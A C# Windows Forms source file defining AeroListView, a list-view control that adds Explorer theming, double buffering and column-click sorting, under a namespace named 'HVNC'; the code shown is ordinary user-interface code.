using System;
using System.Windows.Forms;

namespace HVNC
{
    internal class AeroListView : ListView
    {
        private const uint WM_CHANGEUISTATE = 295;
        private const short UIS_SET = 1;
        private const short UISF_HIDEFOCUS = 1;
        private readonly IntPtr _removeDots = new IntPtr(NativeMethodsHelper.MakeWin32Long(1, 1));

        public AeroListView()
        {
            SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
            LvwColumnSorter = new ListViewColumnSorter();
            ListViewItemSorter = LvwColumnSorter;
            View = View.Details;
            FullRowSelect = true;
        }

        private ListViewColumnSorter LvwColumnSorter { get; }

        protected override void OnHandleCreated(EventArgs e)
        {
            base.OnHandleCreated(e);
            if (PlatformHelper.RunningOnMono)
                return;
            if (PlatformHelper.VistaOrHigher)
                NativeMethods.SetWindowTheme(Handle, "explorer", null);
            if (!PlatformHelper.XpOrHigher)
                return;
            NativeMethods.SendMessage(Handle, 295U, _removeDots, IntPtr.Zero);
        }

        protected override void OnColumnClick(ColumnClickEventArgs e)
        {
            base.OnColumnClick(e);
            if (e.Column == LvwColumnSorter.SortColumn)
            {
                LvwColumnSorter.Order = LvwColumnSorter.Order == SortOrder.Ascending
                    ? SortOrder.Descending
                    : SortOrder.Ascending;
            }
            else
            {
                LvwColumnSorter.SortColumn = e.Column;
                LvwColumnSorter.Order = SortOrder.Ascending;
            }

            if (VirtualMode)
                return;
            Sort();
        }
    }
}